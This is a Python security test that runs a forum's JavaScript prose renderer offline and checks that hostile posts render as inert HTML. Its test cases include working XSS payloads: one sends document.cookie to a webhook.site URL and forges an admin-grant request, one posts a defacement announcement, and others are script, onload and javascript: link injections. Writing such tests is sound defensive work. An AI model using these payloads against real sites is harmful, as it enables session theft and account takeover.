"""Render hostile forum text without a browser/network, then inspect parsed HTML.

Usage: python web/tools/test_prose_security.py [path/to/production-app.js] [incident-cases.json]
The JavaScript VM runs only the site's renderer; payloads are string arguments.
"""
import json
from html.parser import HTMLParser
from pathlib import Path
import subprocess
import sys


class Inspect(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.tags = []
        self.text = []

    def handle_starttag(self, tag, attrs):
        assert tag in {"p", "br", "a", "span", "b", "i", "pre", "code", "blockquote"}, (tag, attrs)
        self.tags.append(tag)
        for name, value in attrs:
            assert not name.lower().startswith("on"), (name, value)
            if name in {"href", "src"}:
                assert value.startswith(("https://", "http://", "#/u/")), value

    def handle_data(self, text):
        self.text.append(text)


source = Path(sys.argv[1]) if len(sys.argv) > 1 else Path(__file__).resolve().parents[1] / "src/app.js"
attack = '''<img src=x onerror="fetch('https://webhook.site/b718cbc7-da89-440f-a359-c0de8a4b772c/?c='+document.cookie); fetch('/api/admin/users', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body:JSON.stringify({uid:1833, staff:true, admin:true, owner:true})})">'''
cases = [
    "Look at this: ||" + attack + "||", attack, "`" + attack + "`",
    "```html\n" + attack + "\n```", "> " + attack,
    '<svg/onload="alert(1)">', '<script>alert(1)</script>',
    '&lt;img src=x onerror=alert(1)&gt;',
    'https://example.invalid/\" onmouseover=\"alert(1)',
    '||**<iframe srcdoc="<script>alert(1)</script>">**||',
    '[click](javascript:alert(1))',
    '||<svg onload="fetch(String.fromCharCode(47,97,112,105),{method:String.fromCharCode(80,79,83,84)})">||',
    '<img src=x onerror="fetch(\'/api/admin/announcements\',{method:\'POST\',credentials:\'include\',body:JSON.stringify({body:\'<h1>HACKED BY CRIMSON</h1>\'})})">',
    '<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>',
    '**bold** *italic* `code` ||spoiler|| @player https://example.invalid/test',
]
if len(sys.argv) > 2:
    incidents = json.loads(Path(sys.argv[2]).read_text(encoding="utf-8"))
    assert isinstance(incidents, list) and all(isinstance(s, str) for s in incidents)
    cases[-1:-1] = incidents
runner = r'''
const vm = require('node:vm');
const data = JSON.parse(require('node:fs').readFileSync(0, 'utf8'));
const start = data.source.indexOf('function prose(');
const end = data.source.indexOf('// ---- the editor', start);
if (start < 0 || end < 0) throw Error('renderer boundaries missing');
const escLine = data.source.split('\n').find(l => l.startsWith('const esc = '));
if (!escLine) throw Error('escape helper missing');
const ctx = vm.createContext({FO: {uploaded: {}}, L: a => a, profHref: s => '#/u/' + s});
vm.runInContext(escLine + '\n' + data.source.slice(start, end), ctx, {timeout: 1000});
const out = data.cases.map(text => {ctx.input = text; return vm.runInContext('prose(input)', ctx, {timeout: 1000});});
process.stdout.write(JSON.stringify(out));
'''
result = subprocess.run(["node", "-e", runner], input=json.dumps({"source": source.read_text(encoding="utf-8"), "cases": cases}), text=True, encoding="utf-8", capture_output=True, check=True)
rendered = json.loads(result.stdout)
for i, html in enumerate(rendered):
    parsed = Inspect()
    parsed.feed(html)
    if i == 0:
        assert "span" in parsed.tags, "original payload must exercise spoiler rendering"
        assert attack in "".join(parsed.text), "original attack must remain literal visible text"
    if i == len(cases) - 1:
        assert {"b", "i", "code", "span", "a"}.issubset(parsed.tags), "normal formatting regressed"
print(f"PASS: {len(cases)} hostile/normal forum-rendering cases: {source}")
